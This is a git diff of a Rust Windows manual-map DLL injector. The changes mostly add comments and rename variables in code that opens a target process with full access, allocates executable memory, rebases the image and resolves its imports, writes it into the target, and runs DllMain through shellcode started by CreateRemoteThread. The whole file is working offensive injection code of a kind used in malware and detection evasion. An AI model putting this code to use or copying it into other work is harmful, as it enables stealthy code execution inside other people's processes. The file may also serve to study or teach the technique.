@@ -1,5 +1,5 @@
 use std::{ptr::{null_mut}, intrinsics::{copy_nonoverlapping, transmute}, ffi::c_void, io, mem::size_of};
-use winapi::{um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_SECTION_HEADER, IMAGE_NT_SIGNATURE, IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, IMAGE_THUNK_DATA64, IMAGE_SNAP_BY_ORDINAL64, IMAGE_ORDINAL64, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR}, errhandlingapi::GetLastError, memoryapi::{VirtualAllocEx, WriteProcessMemory}, libloaderapi::{LoadLibraryA, GetProcAddress}, handleapi::CloseHandle}, shared::minwindef::FALSE};
+use winapi::{um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_SECTION_HEADER, IMAGE_NT_SIGNATURE, IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_SNAP_BY_ORDINAL64, IMAGE_ORDINAL64, PIMAGE_THUNK_DATA64, IMAGE_IMPORT_DESCRIPTOR}, errhandlingapi::GetLastError, memoryapi::{VirtualAllocEx, WriteProcessMemory}, libloaderapi::{LoadLibraryA, GetProcAddress}, handleapi::CloseHandle}, shared::minwindef::FALSE};
 
 /// Manually Maps a DLL in the target process
 pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
@@ -9,6 +9,7 @@ pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
     let local_image = copy_sections_to_local_process(nt_headers, dll_bytes.as_ptr());
     println!("[+] Local allocated memory region: {:p}", local_image.as_ptr());
 
+    // Get a handle to the target process with all access
     let process_handle = unsafe { 
         OpenProcess(
             PROCESS_ALL_ACCESS,
@@ -23,6 +24,7 @@ pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
 
     println!("[+] Process handle: {:?}", process_handle);
 
+    // Allocate memory in the target process for the image
     let remote_image = unsafe { 
         VirtualAllocEx(
             process_handle,
@@ -42,6 +44,7 @@ pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
     unsafe { rebase_image(nt_headers, local_image.as_ptr(), remote_image) };
     unsafe { resolve_imports(nt_headers, local_image.as_ptr()) };
 
+    // Write the the local image to the target process after rebasing and resolving imports in the local process
     let wpm_result = unsafe {
         WriteProcessMemory(
             process_handle,
@@ -56,12 +59,14 @@ pub fn manual_map(dll_bytes: Vec<u8>, process_id: u32) {
         error("Failed to write the local image to the target process");
     }
 
+    // Calculate the AddressOfEntryPoint for the PE file
     let entry_point = unsafe { remote_image as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
 
     println!("[+] Entry Point: {:#x}", entry_point);
 
     unsafe { call_dllmain(remote_image as usize, entry_point, process_handle) };
 
+    // Close process handle
     unsafe { CloseHandle(process_handle) };
 }
 
@@ -80,9 +85,11 @@ unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mu
         0xC3,                                                       // ret
     ];
 
-    (shellcode.as_mut_ptr().offset(6) as *mut u64).write_volatile(image_base as u64);
-    (shellcode.as_mut_ptr().offset(26) as *mut u64).write_volatile(entrypoint as u64);
+    // Insert the image base and entry point as parameters to DllMain
+    (shellcode.as_mut_ptr().offset(6) as *mut usize).write_volatile(image_base as usize);
+    (shellcode.as_mut_ptr().offset(26) as *mut usize).write_volatile(entrypoint as usize);
 
+    // Allocate memory for the shellcode in the target process
     let shellcode_memory = VirtualAllocEx(
         process_handle,
         null_mut(),
@@ -97,6 +104,7 @@ unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mu
     
     println!("[+] Remote allocated memory region for shellcode: {:p}", shellcode_memory);
 
+    // Write the shellcode that execute Dllmain to the target process
     let wpm_result = WriteProcessMemory(
         process_handle,
         shellcode_memory as _,
@@ -109,6 +117,7 @@ unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mu
         error("Failed to write shellcode to the target process");
     }
 
+    // Create remote thread and execute our shellcode
     let thread_handle = CreateRemoteThread(
         process_handle,
         null_mut(),
@@ -123,6 +132,7 @@ unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mu
         error("Failed to create remote thread");
     }
 
+    // Close thread handle
     CloseHandle(thread_handle);
     //WaitForSingleObject(thread_handle, 0xFFFFFFFF);
 }
@@ -130,71 +140,107 @@ unsafe fn call_dllmain(image_base: usize, entrypoint: usize, process_handle: *mu
 /// Resolve the image imports
 unsafe fn resolve_imports(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8) {
 
-     let mut import_dir = (local_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as PIMAGE_IMPORT_DESCRIPTOR;
+    // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
+    let mut import_directory = (local_image as usize 
+        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) 
+        as PIMAGE_IMPORT_DESCRIPTOR;
 
-     while (*import_dir).Name != 0x00 {
-         
-         let lib_name = (local_image as usize + (*import_dir).Name as usize) as *const i8;
-         let lib = LoadLibraryA(lib_name);
-
-         let mut orig_thunk = if *(*import_dir).u.OriginalFirstThunk() != 0 {
-            (local_image as usize + *(*import_dir).u.OriginalFirstThunk() as usize) as *mut IMAGE_THUNK_DATA64
+    while (*import_directory).Name != 0 {
+        
+        // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
+        let dll_name = (local_image as usize 
+            + (*import_directory).Name as usize) as *const i8;
+        
+        // Load the DLL in the in the address space of the process
+        let dll_handle = LoadLibraryA(dll_name);
+        
+        let mut original_first_thunk = if *(*import_directory).u.OriginalFirstThunk() != 0 {
+            // Get a pointer to the OriginalFirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
+            (local_image as usize + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64
         } else {
-            (local_image as usize + (*import_dir).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64
-        };         
+            // Get a pointer to the FirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
+            (local_image as usize + (*import_directory).FirstThunk as usize) as PIMAGE_THUNK_DATA64
+        };
 
-        let mut thunk = (local_image as usize + (*import_dir).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
+        // Get a pointer to the first Thunk in the OriginalFirstThunk
+        let mut thunk = (local_image as usize 
+            + (*import_directory).FirstThunk as usize) 
+            as PIMAGE_THUNK_DATA64;
  
-         while (*orig_thunk).u1.Function() != &0x00 {
-            if IMAGE_SNAP_BY_ORDINAL64(*(*orig_thunk).u1.Ordinal()) {
-                let fn_ordinal = IMAGE_ORDINAL64(*(*orig_thunk).u1.Ordinal()) as _;
-                *(*thunk).u1.Function_mut() = GetProcAddress(lib, fn_ordinal) as _;
+        while (*original_first_thunk).u1.Function() != &0 {
+            
+            // Get a pointer to _IMAGE_IMPORT_BY_NAME
+            let thunk_data = (local_image as usize
+                + *(*original_first_thunk).u1.AddressOfData() as usize)
+                as PIMAGE_IMPORT_BY_NAME;
+
+            // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
+            if IMAGE_SNAP_BY_ORDINAL64(*(*original_first_thunk).u1.Ordinal()) {
+                //#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
+                let fn_ordinal = IMAGE_ORDINAL64(*(*original_first_thunk).u1.Ordinal()) as _;
+                *(*thunk).u1.Function_mut() = GetProcAddress(dll_handle, fn_ordinal) as _;
             } else {
-                let fn_name = (local_image as usize + *(*orig_thunk).u1.AddressOfData() as usize) as *mut IMAGE_IMPORT_BY_NAME;
-                *(*thunk).u1.Function_mut() = GetProcAddress(lib, &(*fn_name).Name[0] as *const _ as *mut _) as _;
+                // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
+                let fn_name = (*thunk_data).Name.as_ptr();
+                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in the IMAGE_THUNK_DATA64
+                *(*thunk).u1.Function_mut() = GetProcAddress(dll_handle, fn_name) as _;
             }
+
+            // Increment Thunk and OriginalFirstThunk
             thunk = thunk.offset(1);
-            orig_thunk = orig_thunk.offset(1);
-         }
+            original_first_thunk = original_first_thunk.offset(1);
+        }
 
-         import_dir = (import_dir as u64 + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as u64) as _;
-     }
-
+        // Get a pointer to the next _IMAGE_IMPORT_DESCRIPTOR
+        import_directory = (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
+    }
 }
 
 /// Rebase the image / perform image base relocation
 unsafe fn rebase_image(nt_headers: PIMAGE_NT_HEADERS64, local_image: *const u8, remote_image: *mut c_void) {
     
-    let mut current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(local_image as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize);
-    let relocation_end = current_base_relocation as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
+    // Get a pointer to the first _IMAGE_BASE_RELOCATION
+    let mut base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(local_image as usize 
+        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize);
+    
+    // Get the end of _IMAGE_BASE_RELOCATION
+    let base_relocation_end = base_relocation as usize 
+        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
+    
+    // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
     let delta = remote_image as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
     
-    while (*current_base_relocation).VirtualAddress != 0u32 && (*current_base_relocation).VirtualAddress as usize <= relocation_end && (*current_base_relocation).SizeOfBlock != 0u32 {
-        let address = (local_image as usize + (*current_base_relocation).VirtualAddress as usize) as isize;
-        let item = transmute::<usize, *const u16>(current_base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>());
-        let count = ((*current_base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;
+    while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
+        
+        // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
+        let address = (local_image as usize + (*base_relocation).VirtualAddress as usize) as isize;
+        let item = transmute::<usize, *const u16>(base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>());
+        let count = ((*base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;
 
         for i in 0..count {
+            // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
             let type_field = item.offset(i as isize).read() >> 12;
             let offset = item.offset(i as isize).read() & 0xFFF;
 
+            //#define IMAGE_REL_BASED_DIR64   10
             if type_field == IMAGE_REL_BASED_DIR64 {
-                //let mut relocate_me = *((address + offset as isize) as *mut isize);
-                //relocate_me = delta + relocate_me;
+                // Add the delta to the value of each address where the relocation needs to be performed
                 *((address + offset as isize) as *mut isize) += delta;
             }
         }
 
-        current_base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(current_base_relocation as usize + (*current_base_relocation).SizeOfBlock as usize);
+        // Get a pointer to the next _IMAGE_BASE_RELOCATION
+        base_relocation = transmute::<usize, PIMAGE_BASE_RELOCATION>(base_relocation as usize + (*base_relocation).SizeOfBlock as usize);
     }
 }
 
 /// Copy sections of the dll to a memory location in local process (heap)
 fn copy_sections_to_local_process(nt_headers: PIMAGE_NT_HEADERS64, dll_bytes: *const u8) -> Vec<u8> {
-    
+    // Allocate memory on the heap for the image
     let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize ;
     let mut image = vec![0; image_size];
 
+    // Get a pointer to the _IMAGE_SECTION_HEADER
     let section_header = unsafe { 
         transmute::<usize, PIMAGE_SECTION_HEADER>(&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
     };
@@ -202,15 +248,17 @@ fn copy_sections_to_local_process(nt_headers: PIMAGE_NT_HEADERS64, dll_bytes: *c
     println!("[+] IMAGE_SECTION_HEADER: {:p}", section_header);
 
     for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
+        // Get a reference to the current _IMAGE_SECTION_HEADER
         let section_header_i = unsafe { &*(section_header.add(i as usize)) };
-        //println!("Section: {:p}", section_header_i);
         
+        // Get the pointer to current section header's virtual address
         let destination = unsafe { image.as_mut_ptr().offset(section_header_i.VirtualAddress as isize) };
+        // Get a pointer to the current section header's data
         let source = dll_bytes as usize + section_header_i.PointerToRawData as usize;
+        // Get the size of the current section header's data
         let size = section_header_i.SizeOfRawData as usize;
 
-        //println!("[+] Section source: {:#x} and Section destination: {:#p}", source, destination);
-        // copy section headers into the local process
+        // copy section headers into the local process (allocated memory on the heap)
         unsafe { 
             copy_nonoverlapping(
                 source as *const c_void,
